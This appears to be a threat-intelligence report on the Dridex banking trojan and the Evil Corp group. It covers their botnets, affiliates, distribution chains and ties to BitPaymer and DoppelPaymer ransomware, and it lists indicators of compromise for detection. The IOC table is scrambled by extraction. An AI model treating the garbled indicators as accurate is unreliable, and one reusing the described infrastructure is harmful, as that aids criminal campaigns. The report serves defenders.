machines then relay the information transmitted by the C2 to the other infected machines featuring in their list, which will do the same.17/07/2020Page 4 sur 24TLP:WHITETLP:WHITEThe malware Dridex: origins and usesFig. 1.2 : How the botnet Dridex worksEach bot (peer) can be identiﬁed within the P2P network via two IDs it generates: the bot ID identiﬁes the infected user on a computer and the computer ID identiﬁes the latter. In this way, multiple infections on the same compu- ter can be detected. Moreover, each bot keeps a list of other peers, i.e. IP addresses and port numbers. In order to ensure this list remains active, the peers ask the nodes for updates at regular intervals.Dridex’ maximum infection rate is considered to have been reached over the 2015-2016 period. In 2015, the main countries to be targeted by Dridex were the UK, Italy and France, which had 1,804 bots. The United States was the next most common target [11].1.3 Afﬁliate model While some banking trojans are sold alone and deployed by the customer, Dridex operates according to an affiliate model. Each affiliate has access to a subset of bots [12], while the group Evil Corp controls the C2 backends of the different Dridex botnets.According to the Western District of Pennsylvania Court indictment against members of Evil Corp, the affiliates apparently purchase Dridex use from the group (e.g. for USD 100,000 in the case of one British mule11 who became an affiliate), then funnel half of the proﬁts along with USD 50,000 per week to the group so as to retain the privilege of being able to use it. In return, Evil Corp is said to provide technical support [10].The affiliates are distinguished by:• their botnet ID, i.e. the number attributed to the Dridex version associated with the subset of bots they manage. With these botnet IDs, the activity of each of the affiliates can be distinguished and different botnet IDs can be associated with the same operator [13]. For example, in 2015 Dridex had nine botnets supporting11Individual who transfers illegally acquired funds via different bank accounts in different countries.17/07/2020Page 5 sur 24TLP:WHITETLP:WHITEits ecosystem, the three most active being botnets 12012, 20013 and 22014;The malware Dridex: origins and uses• their targets, both in terms of sector and geography: for example, in 2015, the primary target of botnet ID 120 was banks, and France was particularly targeted by botnets 220, 120, 302, 125, 322, 225 and 228 in 2016 and botnet 1011 in 2019 [9, 15];• the chosen infection vector.Fig. 1.3 : Main Dridex Botnet IDs from 2015 to today12Which apparently contained 100,000 bots in May 2015 [10]. 13Which apparently contained 750 bots in April 2015 [14]. 14Which apparently contained 9,650 bots in April 2015 [14, 9].17/07/2020TLP:WHITEPage 6 sur 24TLP:WHITEThe malware Dridex: origins and uses2 Dridex' developers: Evil CorpThe names given in this chapter come from open sources and judicial documents that have been systematically referenced.2.1 The group’s origins: ZeuS, JabberZeuS and GameOverZeuS In 2005-2006 or thereabouts, M. Bogachev (alias Slavik, lucky12345) created the trojan ZeuS (alias Zbot) (see Ap- pendix 6.1). ZeuS was hired out as malware-as-a-service to other cybercriminal groups [16].In early 2009, M. Bogachev began working with the cybercriminal group named ”Business Club”, allegedly led by M. Yakubets (alias Aqua) [17]. The group is thought to have called on Bogachev to collaborate on developing an enhanced version of Zeus capable of routing information to the threat actors on the compromised bank accounts, and particularly of notifying them when a victim signs in to their online bank account [18]. This version, enhanced by use of the XMPP (Extensible messaging and presence protocol) protocol, commonly dubbed Jabber [19], would be renamed JabberZeuS (see Appendix 6.2).At the end of 2010, M. Bogachev claimed he was retiring, after reaping nearly USD 100m worth of proﬁts during his ﬁve years in operation [20]. The FBI nevertheless published an indictment against M. Bogachev in June 2014, which would suggest that he continued his malicious operations.In May 2011, Zeus’ source code went public. To date, 447 variants of Zeus, associated with 27 families, have been identiﬁed [21].In September 2011, a variant of ZeuS, Murofet (alias Licat), emerged, allegedly becoming the leading tool leveraged by members of the Business Club [17], and was soon after renamed GameOverZeuS (GoZ) (see Appendix ??). In 2012, the botnet GoZ also distributed the ransomeware Cryptolocker.In May 2014, the FBI-led Operation Tovar, supported by the Russian police [20], took down the infrastructure of GoZ and Cryptolocker, as well as the P2P network of the GoZ botnet. At the time, this included some 1 million bots, and was responsible for fraudulent transactions totalling tens of millions of dollars [18].2.2 Evil Corp 2.2.1 2014: from JabberZeuS to Evil Corp The banking trojan Dridex ﬁrst appeared on the scene in June 201415. Dridex is v5 of the malware Bugat, which surfaced in 2010, and is manifestly operated (perhaps even developed) by at least one member of the Business Club, Yakubets and Ghinkul, one of the operators of Troyak, the bulletproof hosting provider16 (taken down in 2010) of Business Club [18].A. Ghinkul (alias Smilex) [10], a Moldovan national, was arrested in August 2015 in Cyprus and extradited to the US [22], after Dell SecureWorks experts redirected the control points of the botnet Dridex towards a sinkhole17 server, enabling the FBI to dismantle the associated infrastructure and pick him out from among 14 Dridex distributors. Ghinkul most likely belonged to the team administrating botnet ID 120.15Two weeks after GOZ was taken down, the banking trojan Dyre also allegedly appeared. In addition to having the same developer as Gozi Neverquest, some attacks involving Dyre could be connected to the Business Club. It is quite possible, then, that the group branched out, harnessing Dyre to steal money from large business banking accounts, and Dridex to steal money from retail banking accounts. In November 2015, the arrest of Dyre’s operators led to it becoming completely inactive [18].16On the black market, criminals offer servers for hire that are remote from any jurisdiction. These are called bulletproof servers. Once hiredout, a command centre can be installed in the server.17Sinkholing involves redirecting data ﬂow from zombie machines to a server outside the control of malicious operators.17/07/2020Page 7 sur 24TLP:WHITETLP:WHITEThe malware Dridex: origins and usesComment: it is interesting to note that, following Ghinkul’s arrest, botnet ID 120 was not the only one to become tempo- rarily inactive: botnet 220 associated with TA505 only resumed operations three months afterwards.Despite this arrest, the Business Club, henceforth known as Evil Corporation (alias EvilCorp, Indrik Spider), headed up by Yakubets, has renewed its infrastructure and remained active.Fig. 2.1 : Mapping of links between Russian-speaking cybercriminal groups, from ZeuS to Evil CorpIn a joint indictment dated 5 December 2019, the US Department of Justice and Britain’s National Crime Agency identiﬁed nine members of the group Evil Corp. In addition to M. Yakubets:• I. Turashev allegedly acted as administrator of the malware Dridex and lent technical assistance to its opera-tors;• D. Gusev is accused of having materially and ﬁnancially facilitated Evil Corp, with six Russian-based companiesfor which he was the General Director receiving sanctions on the part of the US Treasury [23];17/07/2020Page 8 sur 24TLP:WHITETLP:WHITEThe malware Dridex: origins and uses• The six main remaining members of Evil Corp18 have particularly been identiﬁed through posts on social media [24], most ﬂaunting lavish spending sprees including luxury cars with “BOP” in the number plate (pronounced “VOR”, which means “thief” in Russian).In addition to Dridex, Blueliv alleges that Evil Corp has also distributed other trojans including (POS malware) [25], as well as Carbanak19 [26]. Evil Corp is most likely made up of two operational teams, each with spammers, i.e. individuals specialising in the distribution of phishing campaigns not only on behalf of Evil Corp but also other threat actor groups [27].2.2.2 Evil Corp's development since 2017 The ransomware BitPaymer Discovered in July 2017 [28], the ransomware Bitpaymer (alias FriedEx) ﬁrst hit the headlines following its attack against Britain’s National Health Service (NHS), at a Scottish hospital, in August 2017.Bitpaymer is a binary ﬁle, which means it cannot be distributed or log in to a C2 server of its own accord. Its opera- tors therefore execute it manually. It has many code similarities with Dridex [28]. Moreover, a lot of attacks leading to encryption by the ransomware Bitpaymer have involved prior compromising by Dridex. Such connections sug- gest that Bitpaymer has been developed and operated by Evil Corp.Bitpaymer represents a change in tactics on the part of Evil Corp, with precedence now given to a small number of highly proﬁtable targeted attacks (Big Game Hunting) rather than its massive Dridex schemes run since 2014. In 2019, it appears that Evil Corp is now using Dridex no longer to commit bank fraud but to conduct recce operations on the ISs it compromises so as to determine whether or not it is worth distributing Bibpaymer on them [25]. Bitpaymer’s typical infection chain involving Dridex is as follows:Fig. 2.2 : Bitpaymer’s infection chain involving DridexThat said, Bitpaymer can also apparently be distributed by Emotet rather than Dridex (which is itself sometimes distributed by Emotet) [29, 30].18Dmitry Smirnov, Artyom Yakubets, Ivan Tuchkov, Andrey Plotnitsky, Dmitry Slobodskoy and Kirill Slobodskoy. 19In 2016, there are even reports that Carbanak was sometimes downloaded by Dridex loader within infected ISs.17/07/2020Page 9 sur 24TLP:WHITETLP:WHITEThe malware Dridex: origins and usesThe indictment against Yakubets and other members of Evil Corp, published in early December 2019, does not seem to have dented the cybercriminal group’s activities much, given the ongoing BitPaymer campaigns.Split within Evil Corp In April 2019, Evil Corp is thought to have split into two groups: Indrik Spider and Doppel Spider20 [31]. While Indrik Spider allegedly ran the malware Dridex and Bitpaymer, as had been done since 2018, Doppel Spider pur- portedly executed a modiﬁed version of Dridex, DoppelDridex, as well as a variant of the ransomware BitPaymer, DoppelPaymer. In this way, it not only deployed banking fraud campaigns via DoppelDridex only, but also ran- somware campaigns via DoppelPaymer.Given that:• the malware FakeUpdates distributed Dridex in October 2019, and that Dridex deployed either BitPaymer orDoppelPaymer within the victims’ ISs [32],• during a DoppelPaymer incident, FireEye detected the downloading of Dridex v4 botnet ID 501 (associated with Evil Corp), then of Dridex v2 botnet ID 12333 in a bid to deploy DoppelPaymer (associated with Doppel Spider) [32];• Doppel Spider uses the services of Emotet [31], as does Evil Corp,It would appear that the two groups are continuing to collaborate, or perhaps even that Doppel Spider is a sub- group of Evil Corp.PHowever, since the ﬁrst quarter of 2020, what distinguishes the operators behind DoppelPaymer from Bitpaymer’s operators is that the former have started to publish the data exﬁltrated from the IS of their victims (on the website www.doppleshare[.]top/), in the same way as operators of other ransomware (Maze, Sodinokibi, Clop and Nemty in particular) [33].20Indrik Spider and Doppel Spider are two alias established by Crowdstrike.17/07/2020Page 10 sur 24TLP:WHITETLP:WHITEThe malware Dridex: origins and uses3 Distribution of Dridex by the main afﬁliatesThe infection vector comes across as the most discriminating characteristic of the different botnet IDs, and therefore of the different affiliates. That said, there is a risk of confusing the affiliate and the distributor chosen by the latter. For example, the operator of a botnet distributing the Dridex of a speciﬁc botnet ID must not be confused with the affiliate of the botnet ID in question.3.1 Phishing emails 3.1.1 The botnet CraP2P (alias Necurs) Active from 2012 to 2020, CraP2P is a botnet specialising in the distribution of phishing campaigns and malware, on behalf of various threat actor groups. Over this time, the number of bots making it up has risen to nine million. Any one of these bots was capable of sending out several million spam emails in the space of a few dozen days [34]. CraP2P was, for example, used by its operators to distribute GoZ in 2013, Cryptolocker in 2014 and Dridex from at least 2015 [35].Over the 2015-2016 period, CraP2P was behind phishing campaigns particularly delivering Dridex botnets, ID 120, 122, 123, 220, 223 and 301. Whereas botnet ID 120 was associated with A. Ghinkhul until the middle of 2015, bot- nets 220 and 223 have been associated with TA505 [36].According to Proofpoint [37], the cybercriminal group TA505 began using Dridex in July 2014, so a month after it was designed (June 2014). TA505 made fairly intermittent use of Dridex until June 2016 then completely stopped using it in June 2017. The botnet IDs used by TA505 between 2014 and 2015 to deploy Dridex are most likely 125, 220 (targeting the UK, France and Australia) and 223 (targeting Germany and Austria). TA505 reportedly then used botnets, ID 7200 and 7500 (probably in 2017).Comment: Because TA505 used one of the three most active botnet IDs of the Dridex network (ID 220), it could have been confused with Evil Corp, whereas it was ultimately no more than a particularly engaged affiliate of the P2P network, and therefore, in effect, in close collaboration with Evil Corp.It thus appears that the operators of CraP2P were working closely with Evil Corp and some of its affiliates in terms of distribution, which resulted from past collaboration with GoZ.Comment: Some sources indicate that Evil Corp could be the operator of the CraP2P botnet, while others claim that this could be TA505. Without further evidence, it is only possible to conﬁrm a close relationship between these different groups.3.1.2 The botnet Cutwail TA544 (alias Narwhal Spider) is a cybercriminal service provider believed to make the botnet Cutwail available for hire on Russian-speaking underground forums21 [38].Over the period it was active, GoZ rented access to part of the infrastructure of the botnet Cutwail to distribute phishing emails [39]. Its supposed successor, Evil Corp, is also thought to have called on the services of TA544 [40].In 2019, the botnet Cutwail was distributing Dridex ID 1044 via phishing campaigns [41], primarily targeted at the United States, Canada and Australia. At least once in November 2019, the infection chain purportedly did not stop at Dridex, since the latter propagated the ransomware Hermès 22 [15].Comment: It is not easy to tell whether TA544 is an affiliate of Dridex, or whether part of the botnet it operates is used by Evil Corp or one of its affiliates to distribute Dridex, making TA544 a distributor only.21Botnet founded in 2007: GameOver ZeuS was apparently a customer in 2012. 22Used by Lazarus during the attack against the Far Eastern International Bank, Hermès is a ransomware that can be purchased on the DarkWeb.17/07/2020Page 11 sur 24TLP:WHITETLP:WHITEThe malware Dridex: origins and usesFig. 3.1 : Distribution of Dridex via the botnets CraP2P and Cutwail3.1.3 The botnet Andromeda Before it was taken down in 2017, the botnet Andromeda (alias Gamarue) was tasked with distributing Dridex, particularly with the UK as a target in 2016 [13].3.2 As a second payload By Trend Micro’s reckoning, the operators of Emotet, Gozi ISFB (alias Ursnif)23 and Dridex likely share the same PE24 loader25, provider, and perhaps even exchange resources [29].Emotet26 has been able to propagate Dridex since at least 2017 [43]. Emotet has even been known to distribute Bitpaymer, the ransomware exclusively used by Evil Corp. The ﬁrst connections between Emotet and the operators of Dridex, Evil Corp, were found in April 2017 [44].Comment: Evil Corp appears to call on the operators of Emotet (Mummy Spider, Mealybug, TA542) to deliver Dridex as a second payload within the IS that they have already compromised. The operators of TrickBot (Wizard Spider) have the same modus operandi.Regarding Gozi ISFB, TA551 (alias Shathak) used its loader RM3[45] to distribute Dridex botnets, ID 301, 302, 303, 3101 and 35001, in 2018 and 2019 [15, 46] across the US, Canada and Italy. During these same infection chains, Gozi v2 RM3 has sometimes been accompanied by the credential-stealing malware Predator the Thief 27 or ransomware GandCrab (occurrences in December 2018)28.23The original banking trojan horse Gozi was developed in 2006 as a competitor of the trojan horse ZeuS. The source code for Gozi leaked in 2010 and was co-opted by other cybercriminal groups to create other trojans, including Gozi ISFB, Vawtrak (Neverquest) and GozNim, a 25The PE loader enables Windows to perform the instructions of a PE ﬁle. 26Banking trojan horse that surfaced in 2014, and became a loader of such malware families as TrickBot, Gootkit and IcedID from 2017. Theoperators of Emotet allow other cybercriminal groups to rent access to the workstations they have infected [42, 29].27Malware sold on the Dark Web in June 2018. 28GandCrab may well have also been deployed at the end of 2018 during infection chains involving Dridex botnet ID 10202 and TA547, identiﬁedby Proofpoint as the operator of the banking trojan Danabot [47].17/07/2020Page 12 sur 24TLP:WHITETLP:WHITEThe malware Dridex: origins and usesFig. 3.2 : Distribution of Dridex as a second payload of Emotet and Gozi ISFB3.3 Watering hole Since 2019, Dridex v4 botnets, ID 199 and 501, are thought to be distributed via FakeUpdates (alias SocGholish)29. Watering hole attacks, or phishing emails pointing to a malicious URL, entail the display of a false browser update where the malware FakeUpdates would be installed followed by the propagation of Dridex and BitPaymer or Dop- pelPaymer [32]. Spanish IT service provider Everis System fell victim to one of these attacks in November 2019 [25]. In the case of DoppelPaymer, Dridex ID 12333 was reportedly downloaded on the IS after the latter was infected by Dridex v4 botnets, ID 199 or 501.Comment: Logically, Dridex ID 12333 would thus be associated with Doppel Spider. Such would also be case for Dridex ID 40300.Fig. 3.3 : Dridex infection chain via FakeUpdates29Dridex botnet ID 11122 was purportedly distributed in the same way in 2018.17/07/2020Page 13 sur 24TLP:WHITETLP:WHITEThe malware Dridex: origins and usesThese campaigns deliver, in turn, Dridex v4 botnets, ID 199 or 501, AZORult, Chthonic30 and NetSupport RAT31, illustrating the fact that Evil Corp calls on the operator of FakeUpdates, in the same way as other cybercriminal groups, in order to distribute Dridex then BitPaymer.3.4 Exploit kits In June 2019, the exploit kit Spelevo32 delivered Dridex, as well as between September and November, concomi- tantly with the exploit kit Fallout [15], via compromised websites [52].The exploit kit Fallout is thought to be the favourite infection vector of the affiliate corresponding to the botnet ID 10111, while the botnet ID 30102 tends to use the exploit kit Spelevo.30Banking trojan resulting from the trojan ZeusVM, itself a variant of ZeuS, whose builder binary code leaked in June 2015 [48, 49], and itself ba- sed on the malware Zeus, whose source code leaked in 2011. Chthonic has been designed similar to Dridex with a module-based architecture, and shares three of its modules (Pony, SOCKS and VNC) [50].31Legitimate remote access tool [51]. 32This exploit kit is also known to have distributed the ransomware Maze.17/07/2020Page 14 sur 24TLP:WHITETLP:WHITEThe malware Dridex: origins and uses4 ConclusionThe malware Dridex illustrates just how complicated it is to attribute attacks on account of the plethora of intercon- nected groups inhabiting the Russian-speaking cybercriminal ecosystem (providers, customers, botnet operators, etc.). Dridex has a manifold background (Bugat, GoZ), operators from myriad groups (Rock Gang, Avalanche, Jab- berZeuS), just like its affiliates, and is distributed via many different infection vectors, against a wide array of targets all over the world.However, the string of indictments that have built up over the past decade against members of Evil Corp has helped to better pinpoint the group’s activities, connecting individuals to cyberattacks and malware.Be that as it may, Dridex remains a threat in the hands of Evil Corp, Doppel Spider and their current affiliates in particular, in the context of more targeted campaigns aimed at spreading ransomware.17/07/2020Page 15 sur 24TLP:WHITETLP:WHITEThe malware Dridex: origins and uses5 Methods of detectionThe compromise indicators indicated below may be blocked and looked for on an information system to prevent or detect attacks involving the malware Dridex.IOCadmin@belpay.by faber@imaba.nls.palani@itifsl.co.inyportocarrero@elevenca.com tom@blackburnpowerltd.co.ukpranab@pdrassocs.comadmin@sevpazarlama.comfarid@abc-telecom.azbounce@bestvaluestore.orgweb1587p16@mail.ﬂw-buero.atfabianurquiza@correo.dalvear.com.arinfo@melvale.co.ukfaturamento@sidestecaminhoes.com.brcariola72@teletu.itinfo@golfprogroup.cominfo@antonioscognamiglio.iturl url url url url url url url urlﬂip.co.in/lndex.php Adresse IPCommentCampagne Dridex DridexDoppelDridex (botnet ID 40300) DoppelDridex (botnet ID 40300)Dridex 107.152.33. 15 SHA256DoppelDridex (botnet ID 40300) DoppelDridex (botnet ID 40300) DoppelDridex (botnet ID 40300) DoppelDridex (botnet ID 40300) DoppelDridex (botnet ID 40300) DoppelDridex (botnet ID 40300) DoppelDridex (botnet ID 40300) DoppelDridex (botnet ID 40300) Dridex (botnet ID 199 ou 501) Dridex (botnet ID 199 ou 501) Dridex (botnet ID 199 ou 501) Dridex (botnet ID 199 ou 501) Dridex (botnet ID 199 ou 501) Dridex (botnet ID 199 ou 501) Dridex (botnet ID 199 ou 501) DoppelDridex (botnet ID 40300)DridexDridex (botnet ID 199)Dridex DridexSince Dridex is likely to download the ransomware BitPaymer and DoppelPaymer as a second payload, it may be worth focusing detection efforts on these codes in the event Dridex has been identiﬁed on the information system.Because Dridex is also likely to be distributed as a second payload by malware families FakeUpdates, Emotet, Gozi ISFB , there may be equal merit in focusing detection efforts on these codes so as to stop the attack in its tracks.17/07/2020Page 17 sur 24TLP:WHITETLP:WHITEThe malware Dridex: origins and uses6 Appendices 6.1 Appendix 1: Characteristics of the malware package ZeuS ZeuS serves two key purposes:• it turns its victims into zombie machines of the botnet bearing the same name;• it can tell when its victim is signed into a bank’s website and harvests the latter’s account access codes. Thisenables its operators to transfer money from the victims’ accounts to the accounts controlled by mules.Its main functions are as follows [53] :• targeted information theft: for example, in 2007 ZeuS stole information from the US Department of Trans-portation (the United States is its number one target [54];• remote access via the VNC protocol; • program downloading and running33;• deletion of key components for the functioning of the operating system in a bid to destroy the infected ma-chine.Comment: The trojan Zeus would thus have been capable of sabotaging ISs, in the same way as Dridex through its module KillOS.6.2 Appendix 2: JabberZeuS The Business Club all began with the cybercriminal group Rock Gang, which operated from 2004 to 2008, and whose members were of Ukrainian, Russian, Romanian and Moldovan nationality [18]. In 2008, lots of Rock Gang’s members reportedly began to use Avalanche, an extensive global network hosting infrastructure harnessed by dif- ferent groups of cybercriminals [55]. Among them, some, united within the Business Club, allegedly called on M. Bogachev to help develop an enhanced version of ZeuS: JabberZeuS.The new group formed around JabberZeuS includes some ﬁfty individuals, whose privileges stem from their senio- rity and who work across several activities:• fraud: to participate in fraud activities, membership fees must be paid and a proﬁt-sharing agreement signed;• recruitment of mules: some mules were located in two Chinese cities, adjacent to the Russian border, north of Vladivostok [17]. In September 2010, the network of British JabberZeuS mules was arrested during Operation Trident breACH34 [18];• technical support;• provision of services: the group sold access to ZeuS (for USD 3,000 or 4,000 [20], not including modules) and to other trojans. Accordingly, in October 2010, the FBI, collaborating with its British and Ukrainian counterparts, dismantled a network of a dozen or so cybercriminals which had leveraged the malware Zeus to target US bank accounts and siphoned around USD 70m off them [56, 57].Identiﬁed group members include M. Bogachev, M. Yakubets (particularly in charge of recruiting mules), Y. Pen- chukov (alias tank), I. Klepikov (alias petr0vich), A. Bron (alias thehead), Y. Kulibaba (alias jonni), Y. Konovalenko (alias jtk0) and A. Tikonov (alias kusanagi) [58]. The latter is believed to have developed Leprechaun, a system for automating fraudulent transactions on Internet banking platforms, used by JabberZeuS. This system particularly33Function generally used by affiliates of the botnet ZeuS, which also propagated other malware as a second payload in order to ramp up theirearnings.34ACH refers to unauthorised fund transfers occurring in bank accounts.17/07/2020Page 18 sur 24TLP:WHITETLP:WHITEThe malware Dridex: origins and usesmakes it possible to alter a victim’s banking transactions in real time [18]. Brian Krebs35 has identiﬁed disagree- ments within the group between M. Yakubets and M. Bogachev35 [59].6.3 Appendix 3: GameOverZeuS The group built a structure of botnets operating in P2P, via GameOverZeuS and modelled on the ZeuS botnet. This structure had 27 botnets, whose C2 backends were each controlled by a different person or group, operating alongside other malware. Most of these botnets already existed and simply migrated towards the P2P of GoZ when it was designed. In this way, GoZ inﬁltrated computers that had already been infected by JabberZeuS [18].GoZ included an automated fund transfer system, similar to Leprechaun, called The World Bank Center [18].Not only that, but the threat actor group was a customer of the same bullet proof hoster (Troyak) for server use as the Rock Gang and operators of Avalanche and Gozi, and rented access to part of the infrastructure of the botnet Cutwail to distribute phishing emails. They also used the exploit kit BlackHole36 which distributed Pony Loader so as to install the payload GameOver ZeuS, as well as the kit Dirt Jumper in a bid to launch DDoS attacks on banks’ websites and so create a diversion from their fraudulent transfer operations [39].6.4 Appendix 4: On the links between Dridex and Cridex The similarity in names and behaviour between the malware families Dridex and Cridex has long led to the belief that they could have been designed by the same developers. This does not seem to be the case in reality, however.On 10 December 2015, the account DridexBOT appeared on the Twitter network [60], most likely registered using the email address dridex[@]mail.ru created speciﬁcally for the occasion.Although this account behaves like a bot, its tweets are actually written by one or more individuals as can be inferred from its many interactions with accounts of users close to the world of cybersecurity, particularly the blog MalwareTech, which would authenticate the account on 4 April 2016 [61]. Between December 2015 and 14 April 2017, the date of its last tweet, DridexBOT posted 153 messages, frequently aimed at demonstrating the non- existence of links between its source code and those of the Cridex family (Feodo, Geodo, etc.) [62, 63, 64].Finally, it was keen to underline Dridex’ interest for sectors other than banking, not least industrial espionage [65].Fig. 6.1 : Tweets by DridexBOT35During a chat, M. Yakubets agreed with these words from one of the members of JabberZeuS about M. Bogachev: ”he, fucker, annoyed thehell out of everyone, doesn’t want to write bypass of interactives and trojan penetration 35-40%, bitch”.36Also used to deploy the variants of ZeuS Bugat, Feodo and Cridex, as well as the banking trojan horses Mebroot and Torpig.17/07/2020Page 19 sur 24TLP:WHITETLP:WHITEThe malware Dridex: origins and usesFig. 6.2 : Tweet de DridexBOT17/07/2020Page 20 sur 24TLP:WHITETLP:WHITEThe malware Dridex : origins and uses7 Bibliographie[1] ASSISTE. Botnet Dridex. 9 avr. 2020. URL : url [2] SECURITY INTELLIGENCE. New Variant of Bugat Malware Uses Lucrative Gameover Zeus Techniques. 14 août 2014. URL : url gameover-zeus-techniques/.[3] DEVCENTRAL. Dridex BOTnet 220 Campaign DevCentral. 25 fév. 2016. URL : url BROMIUM. Dridex Threat Analysis : Masquerading and Code Injection Techniques. 29 juil. 2019. URL : url ACUNETIX. Pony : A Breakdown of the Most Popular Malware in Credential Theft. 25 sept. 2018. URL : url KASPERSKY. Dridex : A History of Evolution. 27 jan. 2020. URL : url PROOFPOINT. Dridex Campaigns Hitting Millions of Recipients Using Unpatched Microsoft Zero-Day. 10 avr. 2017. URL : url recipients-unpatched-microsoft-zero-day.[8] CERT-FR. Etat de La Menace Liée Aux Botnets. 4 nov. 2019. [9] BIT SIGHT. Dridex Botnets. 24 jan. 2017. URL : url [10] UNITED STATES DISTRICT FOR THE WESTERN DISTRICT OF PENNSYLVANIA. Declaration of Special Agent Brian Stevens in Support of Application for an Emergency Temporary Restraining Order and Order to Show Cause Re Preliminary Injunction. 8 oct. 2015.[11] FIREEYE. Evolution of Dridex. 18 juin 2015. URL : url TREND MICRO. Dealing with the Mess of DRIDEX. 6 déc. 2014. URL : url BOTCONF 2020. Dridex Gone Phishing. 25 sept. 2016. URL : url BIT SIGHT. Dridex. Chasing a Botnet from the Inside. 2015. [15] TWITTER. @Kafeine. 5 déc. 2019. URL : url [16] ZDNET. 10 ans de malwares : les pires botnets des années 2010. 11 déc. 2019. URL : url FOX-IT. “Backgrounds on the Badguys and the Backends”. 2015. In : (2015). [18] SECURE WORKS. Evolution of the GOLD EVERGREEN Threat Group. 15 mai 2017. URL : url XAKER.RU. Le solitaire contre la ”société du mal”. Comment Brian Krebs s’est battu contre les pirates russes d’EvilCorp. 31 jan. 2020. URL : url INSTITUT PANDORE. On décortique Zeus, le malware le plus hardcore jamais découvert. 23 jan. 2020. URL : https: //www.institut-pandore.com/hacking/analyse-malware-zeus/.[20][21] Zeus Museum. 9 avr. 2020. URL : url [22] CNEWS. Un Ressortissant de La Communauté Des Etats Indépendants Sera Incarcéré 15 Ans Pour Le Piratage Informatique d’écoles et d’une Entreprise Pétrolière. 15 fév. 2017. URL : url 2017-02-15_vyhodets_iz_sng_syadet_v_tyurmu_na_15_let_za_vzlom.[23] U.S. DEPARTMENT OF THE TREASURY. Treasury Sanctions Evil Corp, the Russia-Based Cybercriminal Group BehindDridex Malware. 5 déc. 2019. URL : url NATIONAL CRIME AGENCY. International Law Enforcement Operation Exposes the World’s Most Harmful Cyber Crime Group. 5 déc. 2019. URL : url enforcement-operation-exposes-the-world-s-most-harmful-cyber-crime-group.17/07/2020Page 21 sur 24TLP:WHITETLP:WHITEThe malware Dridex : origins and uses[25] BLUELIV. Spanish Consultancy Everis Suffers BitPaymer Ransomware Attack : A Brief Analysis. 6 nov. 2019. URL : https : / / www . blueliv . com / cyber - security - and - cyber - threat - intelligence - blog - blueliv / research/everis-bitpaymer-ransomware-attack-analysis-dridex/.[26] MALWAREBYTES. The Forgotten Domain : Exploring a Link between Magecart Group 5 and the Carbanak APT. 22 oct. 2019. URL : url analysis/2019/10/the- forgotten- domain-exploring-a-link-between-magecart-group-5-and-the-carbanak-apt/.[27] Dell Secure WORKS. “Banking Botnets Persists despite Takedowns”. 2015. In : (2015). [28] ESET. FriedEx : BitPaymer, nouveau rançongiciel des auteurs de Dridex. 31 jan. 2018. URL : url TREND MICRO. URSNIF, EMOTET, DRIDEX and BitPaymer Gangs Linked by a Similar Loader. 18 déc. 2018. URL : url and-bitpaymer-gangs-linked-by-a-similar-loader/.[30] MICROSOFT. Human-Operated Ransomware Attacks : A Preventable Disaster. 5 mar. 2020. URL : url microsoft.com/security/blog/2020/03/05/human-operated-ransomware-attacks-a-preventable- disaster/.[31] CROWDSTRIKE. CrowdStrike Discovers New DoppelPaymer Ransomware & Dridex Variant. 12 juil. 2019. URL :url FIREEYE. Head Fake : Tackling Disruptive Ransomware Attacks. 1er oct. 2019. URL : url BLEEPING COMPUTER. Three More Ransomware Families Create Sites to Leak Stolen Data. 24 mar. 2020. URL : url more- ransomware- families- create- sites-to-leak-stolen-data/.[34] UNITED STATES DISTRICT COURT EASTERN DISTRICT OF NEW-YORK. Complaint. 5 mar. 2020. [35] CYWARE. The Many Faces and Activities of Ever-Evolving Necurs Botnet. 29 déc. 2019. URL : url PROOF POINT. Locky Ransomware : Dridex Actors Get In The Game. 6 avr. 2016. URL : url PROOF POINT. Threat Actor Proﬁle : TA505, From Dridex to GlobeImposter. 27 sept. 2017. URL : url SECURE WORKS. Cutwail Spam Swapping Blackhole for Magnitude Exploit Kit. 18 oct. 2013. URL : url SECURE WORKS. The Lifecycle of Peer to Peer (Gameover) ZeuS. 23 juil. 2012. URL : url MALPEDIA. NARWHAL SPIDER. Mar. 2020. URL : url TWITTER. @FaLconIntel. 16 avr. 2020. URL : url [42] ZDNET. Meet the White-Hat Group Fighting Emotet, the World’s Most Dangerous Malware. 29 fév. 2020. URL : url dangerous-malware/.[43] NAKED SECURITY. Emotet’s Goal : Drop Dridex Malware on as Many Endpoints as Possible. 10 août 2017. URL : url out- for- emotet- the- trojan- thats- nearly-a-worm/.[44] PROOFPOINT. Threat Actor Proﬁle : TA542, From Banker to Malware Distribution Service. 15 mai 2019. URL : url insight/post/threat- actor- profile- ta542- banker- malware-distribution-service.[45] TWITTER. “@Vitali Kremez”. 11 déc. 2019. In : (11 déc. 2019). [46] TWITTER. “@Vitali Kremez”. 17 nov. 2018. In : (17 nov. 2018). [47] PROOFPOINT. DanaBot - A New Banking Trojan Surfaces Down Under. 31 mai 2018. URL : https : / / www .proofpoint.com/us/threat-insight/post/danabot-new-banking-trojan-surfaces-down-under-0.17/07/2020Page 22 sur 24TLP:WHITETLP:WHITEThe malware Dridex: origins and uses[48] COMPUTER WORLD. Leak of ZeusVM Malware Building Tool Might Cause Botnet Surge. 6 juil. 2015. URL : https: //www.computerworld.com/article/2944041/leak- of- zeusvm- malware- building- tool- might- 5 juil. 2015. URL : url 0036- 2015- kins- or- zeusvm- v2000.html.[50] KASPERSKY. Trojan-Banker.Win32.Chthonic. Mar. 2016. URL : url FIREEYE. Fake Software Update Abuses NetSupport Remote Access Tool. 5 avr. 2018. URL : https : / / www . fireeye.com/blog/threat-research/2018/04/fake-software-update-abuses-netsupport-remote- access-tool.html.[52] SOCPRIME. Spelevo Exploit Kit Spreads IcedID and Dridex Trojans. 1er juil. 2019. URL : url Le pouvoir CLAPRATIQUE. “Inside a ZeuS botnet”. 2015. In : Le pouvoir clapratique (2015). [54] COMODO. What Is Zeus Malware? 31 juil. 2018. URL : url US CERT. Avalanche (Crimeware-as-a-Service Infrastructure). 1er déc. 2016. URL : url LEMONDEINFORMATIQUE. Forte montée des attaques ciblées via le malware Zeus. 27 mai 2013. URL : https: //www.lemondeinformatique.fr/actualites/lire-forte-montee-des-attaques-ciblees-via-le- malware-zeus-53727.html.[57] REUTERS. “Analysis : Top Hacker ”Retires”; Experts Brace for His Return”. 29 oct. 2010. In : Reuters (29 oct.2010).[58] UNITED STATES DISTRICT COURT FOR THE DISTRICT OF NEBRASKA. Criminal Complaint. 13 juil. 2012. [59] KREBS ON SECURITY. Inside ‘Evil Corp,’ a $100M Cybercrime Menace. 16 déc. 2019. URL : url TWITTER. @Dridex BOT. 10 déc. 2015. URL : url [61] TWITTER. @MalwareTech. 4 avr. 2016. URL : url 